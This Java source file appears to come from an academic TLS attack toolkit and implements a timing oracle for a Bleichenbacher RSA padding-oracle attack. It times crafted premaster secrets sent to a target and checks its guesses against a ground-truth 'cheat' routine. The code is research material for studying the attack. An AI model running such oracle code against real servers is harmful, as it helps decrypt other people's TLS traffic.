/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.attacker.bleichenbacher.BleichenbacherBigIP;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
import de.rub.nds.ssl.attacker.misc.CommandLineWorkflowExecutor;
import de.rub.nds.ssl.attacker.misc.PKCS15Toolkit;
import de.rub.nds.ssl.attacker.misc.Utility;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {

    /*
     * CONFIGURATION SECTION
     */
    /**
     * The timing boundary between PKCS-valid and PKCS-invalid timings (in clock
     * ticks)
     */
    private static final int TIMING_BOUNDARY = +22000;
    /**
     * Given a timing measurement > TIMING_BOUNDARY, we repeat the measurement
     * with the same ciphertext. We'll keep repeating the measurement as long as
     * the timings t are TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD < t <
     * TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD
     */
    private static final int TIMING_SIGNIFICANCE_THRESHOLD = 2000;
    /**
     * Amount of training measurements per Oracle request.
     */
    private static final int MEASUREMENT_AMOUNT = 250;
    /**
     * Amount of training measurementsTest.
     */
    private static final int TRAINING_AMOUNT = 5000;
    /**
     * Amount of warmup measurementsTest.
     */
    private static final int WARMUP_AMOUNT = 1000;
    /**
     * Boundary to distinguish PKCS valid (but PMS invalid) from PKCS invalid.
     */
    private static final int MIN_BOX_POS = 38;
    /**
     * Boundary to distinguish PKCS invalid from PKCS valid (but PMS invalid).
     */
    private static final int MAX_BOX_POS = 40;
    /*
     * RUNTIME DATA SECTION
     */
    /**
     * Bridge to the executing client.
     */
    CommandLineWorkflowExecutor clwe;
    /**
     * List of valid timings.
     */
    private ArrayList<Long> validTimings = new ArrayList<>(TRAINING_AMOUNT);
    /**
     * List of invalid timings.
     */
    private ArrayList<Long> invalidTimings = new ArrayList<>(TRAINING_AMOUNT);
    /**
     * Cipher (needed for the cheat operation).
     */
    private Cipher cipher;
    /**
     * Valid PKCS encrypted PMS.
     */
    private byte[] case1PMS;
    /**
     * Valid PKCS encrypted PMS (starts with 00 02), but PMS itself is invalid.
     */
    private byte[] case2PMS;
    /**
     * Invalid PKCS encrypted PMS.
     */
    private byte[] case3PMS;
    /**
     * TEMPORARY TEWAKS
     */
    private int minBoxPos = 40;
    private int maxBoxPos = 45;
    /**
     * Round counter - trick to speed up finding:
     */
    private int round = 0;
    /**
     * Status counter to find the amount of errors the TimingOracle caused. The
     * format is {groundTruth}_{timingOracle}
     */
    private int valid_valid = 0;
    private int valid_invalid = 0;
    private int invalid_valid = 0;
    private int invalid_invalid = 0;
    private byte[] originalMessage;
    private BleichenbacherBigIP attacker;

    /**
     * Create a new instance of this object.
     *
     * @param type Oracle type.
     * @param rsaPublicKey Public key of the server.
     * @param command Command to be executed.
     */
    public CommandLineTimingOracleWithoutPrivateKey(
            final RSAPublicKey rsaPublicKey, final String command) {
        this.publicKey = rsaPublicKey;
        this.blockSize = Utility.computeBlockSize(rsaPublicKey);
        this.clwe = new CommandLineWorkflowExecutor(command);
    }

    /**
     * Create a new instance of this object.
     *
     * @param type Oracle type.
     * @param rsaPublicKey Public key of the server.
     * @param command Command to be executed.
     * @param original original message used to perform cheat
     * @param oracleType oracle type
     */
    public CommandLineTimingOracleWithoutPrivateKey(
            final RSAPublicKey rsaPublicKey, final String command,
            final byte[] original, final OracleType oracleType) {
        this.publicKey = rsaPublicKey;
        this.blockSize = Utility.computeBlockSize(rsaPublicKey);
        this.clwe = new CommandLineWorkflowExecutor(command);
        this.originalMessage = original.clone();
        this.oracleType = oracleType;
    }

    /**
     * This method performs the statistical analysis of the timing
     * measurementsTest. It assumes that a valid key has a significantly lower
     * response time than an invalid key. In a nutshell, the method performs
     * Crosby's box test.
     *
     * @param testPMS PKCS to be tested for validity.
     * @param factor Set to 1 for the first run. Will be increased for further
     * recursions.
     * @return True if the PKCS was a valid one or false otherwise.
     * @throws OracleException
     */
    private boolean isValidPKCS(final byte[] testPMS, final int factor)
            throws OracleException {
        long[] caseXTiming = new long[MEASUREMENT_AMOUNT * factor];
        long[] testTiming = new long[MEASUREMENT_AMOUNT * factor];

        Random r = new Random();

        for (int i = 0; i < MEASUREMENT_AMOUNT * factor; i++) {
            clwe.executeClientWithPMS(getCase1PMS());
            if ((r.nextInt() % 2) == 0) {
                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
                testTiming[i] = clwe.executeClientWithPMS(testPMS);
            } else {
                testTiming[i] = clwe.executeClientWithPMS(testPMS);
                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
            }
        }

        Arrays.sort(caseXTiming);
        Arrays.sort(testTiming);

        /* Now write it out to a file. */
//        try {
//            FileWriter fwCaseX = new FileWriter(round + "_caseX.csv", false);
//            FileWriter fwTest = new FileWriter(round + "_test.csv", false);
//            int i = 0;
//            for(long caseX : caseXTiming) {
//                fwCaseX.write(i + ";caseX;" + caseX + "\n");
//                i += 1;
//            }
//            
//            for(long test : testTiming) {
//                fwTest.write(i + ";test;" + test + "\n");
//                i += 1;
//            }
//            fwCaseX.close();
//            fwTest.close();
//        } catch (IOException ex) {
//            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
//        }

        System.out.println("    timing: " + (caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]));
        long timing = caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100];

        if (factor == 1) {
            if (timing < TIMING_BOUNDARY) {
                /*
                 * We found a candidate! Repeat measurement to confirm it.
                 */
                return isValidPKCS(testPMS, 3);
            } else {
                /*
                 * Not a candidate.
                 */
                return false;
            }
        } else {
            return timing < TIMING_BOUNDARY;
        }
//        else {
//            /*
//             * We found a candidate in the previous round. Now lets confirm it.
//             */
//
//            // -5900  >      -9000       +           3000
//            if (timing < (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
//                return true;
//
//                //        -12100 >   -9000          -   3000
//            } else if (timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
//                return false;
//            } else {
//                /*
//                 * The timing is within the "no man's land". Repeat it.
//                 */
//                return isValidPKCS(testPMS, 3);
//            }
//
//        }



    }

    /**
     * Warmup function - prepares the target.
     *
     * @throws OracleException
     */
    public void warmup() throws OracleException {
        // warmup
        System.out.print("warmup... ");
        for (int i = 0; i < WARMUP_AMOUNT / 2; i++) {
            clwe.executeClientWithPMS(getCase2PMS());
            clwe.executeClientWithPMS(getCase3PMS());
            System.out.println(i + "th round");
        }
        System.out.println("done!");
    }

    /**
     * Train the timing oracle.
     *
     * @throws OracleException
     */
    public void trainOracle() throws OracleException {

        long delay;
        // train the oracle using the executeWorkflow functionality
        for (int i = 0; i < TRAINING_AMOUNT; i++) {
            delay = clwe.executeClientWithPMS(getCase2PMS());
            validTimings.add(delay);

            delay = clwe.executeClientWithPMS(getCase3PMS());
            invalidTimings.add(delay);

            if (i % 50 == 0) {
                System.out.print("\r left requests for training "
                        + (TRAINING_AMOUNT - i));
            }
        }
        System.out.println("\n");
        try (FileWriter fw = new FileWriter("training_data.csv");) {
            for (int i = 0; i < TRAINING_AMOUNT; i++) {
                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
                fw.write((i + TRAINING_AMOUNT) + ";valid;"
                        + validTimings.get(i) + "\n");
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    private void decryptAndPrintPKCS(final BigInteger si) {
        BigInteger tmp = new BigInteger(originalMessage).multiply(si);
        tmp = tmp.mod(publicKey.getModulus());
        byte[] decryptedPMS = tmp.toByteArray();
        System.out.println("The error happened for plaintext: ");
        System.out.println(Utility.bytesToHex(decryptedPMS));
    }

    public boolean checkPKCSConformity(final byte[] testPMS)
            throws OracleException {
        boolean result = false;
        boolean groundTruth = false;

        round += 1;

        System.out.println("");
        System.out.println("################### New Measurement #########################");

        //if(round % 1000 == 0) {
        //    System.out.print("\r--> round " + round);
        //}

        numberOfQueries++;
        groundTruth = cheat(attacker.getSi());
        
//        if( (round < 1000) ) {
        // TODO: Ooooh jeeeee!
//            return groundTruth;
        //    return false;
//        } else if(round > 92 && round < 261) {
//            return groundTruth;
//        } else if(round > 264 && round < 434) {
//            return groundTruth;
//        } else if(round > 437 && round < 607) {
//            return groundTruth;
//        } 
        
        if ((round % 20) == 0) {
            System.out.println("###########################");
            System.out.println("# groundTruth_timingOracle");
            System.out.println("++      valid_valid:   " + valid_valid);
            System.out.println("++    invalid_invalid: " + invalid_invalid);
            System.out.println("--      valid_invalid: " + valid_invalid);
            System.out.println("--    invalid_valid:   " + invalid_valid);
            System.out.println("###########################");
        }

        boolean timingOracleAnswer = isValidPKCS(testPMS, 1);

        if (!groundTruth) {
            if (!timingOracleAnswer) {
                /*
                 * all good!
                 */
                invalid_invalid++;
                result = timingOracleAnswer;
            } else {
                /*
                 * The submitted key was invalid but our test predicted 
                 * that the key was valid. This is the worst case, because 
                 * it will most certainly break the subsequent computations. 
                 */
                invalid_valid++;
                System.out.println("ERROR: invalid key was predicted to "
                        + "be valid. Under normal circumstances, the measurement is broken from now on.");
                decryptAndPrintPKCS(attacker.getSi());
                System.out.flush();
                result = timingOracleAnswer;

                /*
                 * Kill the measurement with an exit code !=0 so that the caller
                 * knows that something went wrong
                 */
                System.exit(1);
            }

        } else {
            if (!timingOracleAnswer) {
                /*
                 * The submitted key was valid but our test predicted that 
                 * the key was invalid. This decreases the performance of 
                 * the attack but does not necessarily break subsequent 
                 * computations.
                 */
                valid_invalid++;
                System.out.println("ERROR: valid key was predicted to "
                        + "be invalid. This decreases the attack "
                        + "performance.");
                decryptAndPrintPKCS(attacker.getSi());
                result = timingOracleAnswer;
            } else {
                /*
                 * all good!
                 */
                valid_valid++;

                // System.err.println("OK: valid key was predicted to "
                //        + "be valid");
                result = timingOracleAnswer;
            }
        }

        System.out.println("    " + round + ": Ground truth: " + groundTruth
                + ", timingoracle: " + result);
        
        return result;
    }

    /**
     * Cheat - needed to confirm a guess.
     *
     * @param si
     * @return true if the PMS is valid, false otherwise
     */
    public boolean cheat(final BigInteger si) {
        if (originalMessage == null) {
            throw new RuntimeException("not initialized with an original message");
        }
        boolean result = false;
        BigInteger tmp = new BigInteger(originalMessage).multiply(si);
        tmp = tmp.mod(publicKey.getModulus());
        byte[] decryptedPMS = tmp.toByteArray();
        result = PKCS15Toolkit.conformityChecker(decryptedPMS,
                oracleType, blockSize);
        if (result) {
            System.out.println("cheat tells us it is true for: " + Utility.bytesToHex(decryptedPMS));
        }
        return result;
    }

    /**
     * Get the valid encrypted PMS.
     *
     * @return Valid PKCS encoded, encrypted PMS (deep copy)
     */
    public byte[] getCase1PMS() {
        return case1PMS;
    }

    /**
     * Set the valid encrypted PMS.
     *
     * @param valid Valid PKCS encoded, encrypted PMS to set (creating
     * deep-copied)
     */
    public void setCase1PMS(final byte[] valid) {
        this.case1PMS = valid.clone();
    }

    /**
     * Get the valid encrypted PMS.
     *
     * @return Valid PKCS encoded, encrypted PMS
     */
    public byte[] getCase2PMS() {
        return case2PMS;
    }

    /**
     * Set the valid encrypted PMS.
     *
     * @param valid Valid PKCS encoded, encrypted PMS to set
     */
    public void setCase2PMS(final byte[] case2PMS) {
        this.case2PMS = case2PMS.clone();
    }

    /**
     * Get the invalid encrypted PMS.
     *
     * @return Invalid PKCS encoded, encrypted PMS (deep copy)
     */
    public byte[] getCase3PMS() {
        return case3PMS;
    }

    /**
     * Set the invalid encrypted PMS.
     *
     * @param invalid Invalid PKCS encoded, encrypted PMS to set (creating
     * deep-copied)
     */
    public void setCase3PMS(final byte[] invalid) {
        this.case3PMS = invalid.clone();
    }

    public void setAttacker(BleichenbacherBigIP attacker) {
        this.attacker = attacker;
    }
}
